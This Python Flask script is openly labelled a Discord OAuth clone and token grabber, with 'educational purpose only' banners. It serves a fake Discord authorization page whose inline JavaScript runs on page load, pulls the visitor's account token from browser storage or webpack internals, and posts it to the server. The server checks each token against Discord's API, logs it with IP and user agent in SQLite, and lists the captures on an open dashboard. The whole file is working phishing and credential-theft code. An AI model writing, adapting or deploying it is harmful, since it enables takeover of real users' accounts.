#!/usr/bin/env python3
"""
⚠️ EDUCATIONAL PURPOSE ONLY - Testing on own alt accounts
⚠️ REAL DISCORD OAUTH CLONE + CONSOLE TOKEN GRABBER
"""

import os, json, sqlite3, secrets, requests
from flask import Flask, request, render_template_string, redirect, jsonify
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)
CORS(app)

# Database
conn = sqlite3.connect('tokens.db', check_same_thread=False)
c = conn.cursor()
c.execute("""
    CREATE TABLE IF NOT EXISTS captured (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        token TEXT,
        user_id TEXT,
        username TEXT,
        ip TEXT,
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
""")
conn.commit()

# ═════════════════════════════════════════════════════════════════════════════
# DISCORD OAUTH CLONE - REALISTIC
# ═════════════════════════════════════════════════════════════════════════════

@app.route('/')
def index():
    """EXACT Discord OAuth page clone"""
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Discord Authorization</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                background: #1e1f22;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #dbdee1;
            }
            .container {
                background: #2b2d31;
                border-radius: 8px;
                max-width: 480px;
                width: 100%;
                padding: 32px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.5);
                border: 1px solid #3b3d41;
            }
            .header {
                text-align: center;
                margin-bottom: 24px;
            }
            .discord-logo {
                font-size: 40px;
                font-weight: 900;
                color: white;
                letter-spacing: -1px;
            }
            .discord-logo span { color: #5865F2; }
            .subtitle {
                color: #949ba4;
                font-size: 14px;
                margin-top: 4px;
            }
            .app-info {
                background: #1e1f22;
                border-radius: 6px;
                padding: 16px;
                display: flex;
                align-items: center;
                gap: 12px;
                margin-bottom: 24px;
                border: 1px solid #3b3d41;
            }
            .app-icon {
                width: 48px;
                height: 48px;
                background: #5865F2;
                border-radius: 12px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 24px;
                color: white;
            }
            .app-name {
                font-weight: 600;
                color: white;
                font-size: 16px;
            }
            .app-desc {
                color: #949ba4;
                font-size: 13px;
            }
            .permissions {
                background: #1e1f22;
                border-radius: 6px;
                padding: 16px;
                margin-bottom: 24px;
                border: 1px solid #3b3d41;
            }
            .permissions-title {
                font-weight: 600;
                color: white;
                font-size: 14px;
                margin-bottom: 12px;
            }
            .permission-item {
                display: flex;
                align-items: center;
                gap: 10px;
                padding: 6px 0;
                color: #dbdee1;
                font-size: 14px;
            }
            .permission-item .icon { font-size: 18px; }
            .btn {
                width: 100%;
                padding: 14px;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: background 0.2s;
            }
            .btn-authorize {
                background: #5865F2;
                color: white;
                margin-bottom: 8px;
            }
            .btn-authorize:hover { background: #4752c4; }
            .btn-cancel {
                background: transparent;
                color: #949ba4;
                border: 1px solid #3b3d41;
            }
            .btn-cancel:hover { background: #3b3d41; }
            .footer {
                text-align: center;
                color: #5d626a;
                font-size: 12px;
                margin-top: 16px;
            }
            .footer a { color: #5865F2; text-decoration: none; }
            .warning-banner {
                background: #f23f3f20;
                border: 1px solid #f23f3f40;
                border-radius: 4px;
                padding: 8px 12px;
                font-size: 11px;
                color: #f23f3f;
                text-align: center;
                margin-top: 12px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="discord-logo">🗡️<span>Discord</span></div>
                <div class="subtitle">Authorization Request</div>
            </div>

            <div class="app-info">
                <div class="app-icon">🔐</div>
                <div>
                    <div class="app-name">Anion Security</div>
                    <div class="app-desc">by Anion Labs</div>
                </div>
            </div>

            <div class="permissions">
                <div class="permissions-title">🔓 This application is requesting:</div>
                <div class="permission-item"><span class="icon">👤</span> View your Discord profile</div>
                <div class="permission-item"><span class="icon">📧</span> View your email address</div>
                <div class="permission-item"><span class="icon">🏰</span> View your server memberships</div>
                <div class="permission-item"><span class="icon">🔗</span> View your connected accounts</div>
                <div class="permission-item"><span class="icon">⚡</span> Access your account token</div>
            </div>

            <div style="display:flex; flex-direction:column; gap:8px;">
                <button class="btn btn-authorize" id="authorizeBtn">Authorize</button>
                <button class="btn btn-cancel" onclick="window.location.href='https://discord.com'">Cancel</button>
            </div>

            <div class="footer">
                By continuing, you agree to our <a href="#">Terms of Service</a>
            </div>
            <div class="warning-banner">
                ⚠️ EDUCATIONAL PURPOSE ONLY • Testing on own infrastructure
            </div>
        </div>

        <script>
            // ═══════════════════════════════════════════════════════════
            // CONSOLE TOKEN GRABBER - RUNS AUTOMATICALLY
            // ═══════════════════════════════════════════════════════════

            console.log("%c🔐 Discord Token Grabber Active", "font-size:20px;color:#5865F2;font-weight:bold;");
            console.log("%c⚠️ EDUCATIONAL PURPOSE ONLY", "font-size:14px;color:#f23f3f;");

            // ─── FUNCTION TO GRAB TOKEN FROM DISCORD ──────────────────
            async function grabDiscordToken() {
                try {
                    // Method 1: Check localStorage
                    let token = localStorage.getItem('token');
                    if (!token) {
                        // Method 2: Check sessionStorage
                        token = sessionStorage.getItem('token');
                    }
                    if (!token) {
                        // Method 3: Webpack magic
                        try {
                            const webpack = window.webpackChunkdiscord_app;
                            if (webpack) {
                                const modules = webpack.push([
                                    [], {}, function(e) { return e.c; }
                                ]);
                                const tokenModule = Object.values(modules).find(
                                    m => m?.exports?.getToken
                                );
                                if (tokenModule) {
                                    token = tokenModule.exports.getToken();
                                }
                            }
                        } catch(e) {}
                    }
                    return token;
                } catch(e) {
                    return null;
                }
            }

            // ─── GRAB AND SEND TO SERVER ──────────────────────────────
            async function sendTokenToServer() {
                const token = await grabDiscordToken();
                if (token) {
                    console.log("%c✅ Token Grabbed!", "color:#4CAF50;font-weight:bold;");
                    console.log("Token:", token);

                    // Send to your server
                    try {
                        const response = await fetch('/capture-token', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                token: token,
                                userAgent: navigator.userAgent,
                                timestamp: new Date().toISOString()
                            })
                        });
                        if (response.ok) {
                            console.log("%c✅ Token sent to server!", "color:#4CAF50;");
                        }
                    } catch(e) {
                        console.log("Could not send token:", e);
                    }
                } else {
                    console.log("%c⚠️ No token found. User may not be logged in.", "color:#f23f3f;");
                }
            }

            // ─── RUN ON PAGE LOAD ──────────────────────────────────────
            setTimeout(sendTokenToServer, 2000);

            // ─── ALSO RUN WHEN AUTHORIZE BUTTON IS CLICKED ────────────
            document.getElementById('authorizeBtn').addEventListener('click', function() {
                // Try to grab token again
                setTimeout(sendTokenToServer, 500);
                // Redirect to Discord
                setTimeout(function() {
                    window.location.href = 'https://discord.com/app';
                }, 1000);
            });

            // ─── CONSOLE INSTRUCTIONS ──────────────────────────────────
            console.log("%c📋 Commands:", "font-weight:bold;");
            console.log("  > grabDiscordToken() - Get token manually");
            console.log("  > sendTokenToServer() - Send token to server");
            console.log("  > token - Show token if available");

            // Store token globally for manual access
            window.token = null;
            grabDiscordToken().then(t => { window.token = t; });
        </script>
    </body>
    </html>
    """)

# ═════════════════════════════════════════════════════════════════════════════
# CAPTURE TOKEN API
# ═════════════════════════════════════════════════════════════════════════════

@app.route('/capture-token', methods=['POST'])
def capture_token():
    """Receive token from console script"""
    data = request.json
    token = data.get('token')
    user_agent = data.get('userAgent')
    ip = request.remote_addr

    if token:
        # Try to get user info from token
        try:
            headers = {'Authorization': f'Bearer {token}'}
            resp = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            user = resp.json() if resp.status_code == 200 else {}
        except:
            user = {}

        c.execute(
            """INSERT INTO captured 
               (token, user_id, username, ip, user_agent) 
               VALUES (?, ?, ?, ?, ?)""",
            (
                token,
                user.get('id', ''),
                user.get('username', ''),
                ip,
                user_agent
            )
        )
        conn.commit()

        print(f"🎯 TOKEN CAPTURED!")
        print(f"   Token: {token[:30]}...")
        print(f"   User: {user.get('username', 'Unknown')}")
        print(f"   ID: {user.get('id', 'Unknown')}")
        print(f"   IP: {ip}")
        print("=" * 60)

        return jsonify({"status": "success", "message": "Token captured"})

    return jsonify({"status": "error", "message": "No token"}), 400

# ═════════════════════════════════════════════════════════════════════════════
# DASHBOARD - VIEW CAPTURED TOKENS
# ═════════════════════════════════════════════════════════════════════════════

@app.route('/dashboard')
def dashboard():
    """Superadmin dashboard to view captured tokens"""
    data = c.execute(
        "SELECT * FROM captured ORDER BY id DESC LIMIT 50"
    ).fetchall()

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔐 Token Dashboard</title>
        <style>
            body { font-family: 'Segoe UI', Arial; background: #0a0a1a; color: white; padding: 20px; }
            .container { max-width: 1400px; margin: 0 auto; }
            h1 { color: #5865F2; }
            .stats { display: flex; gap: 20px; margin-bottom: 20px; }
            .stat-card { background: #1a1a2e; padding: 20px; border-radius: 10px; flex: 1; }
            .stat-number { font-size: 2.5em; font-weight: bold; color: #5865F2; }
            table { width: 100%; border-collapse: collapse; background: #1a1a2e; border-radius: 10px; overflow: hidden; }
            th { background: #2a2a4e; padding: 12px; text-align: left; color: #5865F2; }
            td { padding: 10px 12px; border-bottom: 1px solid #2a2a4e; }
            .token { font-family: monospace; font-size: 12px; color: #f23f3f; }
            .warning { color: #f23f3f; border: 1px solid #f23f3f40; padding: 10px; border-radius: 8px; margin: 10px 0; }
            .clear-btn { background: #f23f3f; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Token Dashboard</h1>
            <div class="warning">⚠️ EDUCATIONAL PURPOSE ONLY - Testing on own infrastructure</div>

            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number">""" + str(len(data)) + """</div>
                    <div>Total Tokens Captured</div>
                </div>
            </div>

            <table>
                <tr>
                    <th>ID</th>
                    <th>User</th>
                    <th>User ID</th>
                    <th>Token</th>
                    <th>IP</th>
                    <th>Time</th>
                </tr>
    """

    for row in data:
        html += f"""
        <tr>
            <td>{row[0]}</td>
            <td>{row[5] or 'Unknown'}</td>
            <td>{row[4] or 'Unknown'}</td>
            <td><span class="token">{row[3][:40]}...</span></td>
            <td>{row[6]}</td>
            <td>{row[7]}</td>
        </tr>
        """

    html += """
            </table>
        </div>
    </body>
    </html>
    """
    return html

if __name__ == "__main__":
    port = int(os.getenv('PORT', 8080))
    print("=" * 60)
    print("🚀 DISCORD OAUTH CLONE + TOKEN GRABBER")
    print("=" * 60)
    print(f"🌐 Running on port {port}")
    print(f"📊 Dashboard: http://localhost:{port}/dashboard")
    print("⚠️ EDUCATIONAL PURPOSE ONLY")
    print("=" * 60)
    app.run(host='0.0.0.0', port=port, debug=False)
